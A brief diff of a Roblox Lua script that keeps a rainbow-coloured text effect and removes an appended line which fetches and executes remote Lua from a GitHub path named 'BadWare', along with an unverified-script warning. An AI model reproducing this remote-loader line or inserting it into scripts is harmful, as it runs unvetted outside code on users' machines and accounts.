@@ -21,7 +21,3 @@ game:GetService("RunService").RenderStepped:Connect(function()
     _L.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
 end)
 --anh ket thuc
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/Scripts/BadWare/Hub/Load.lua", true))()
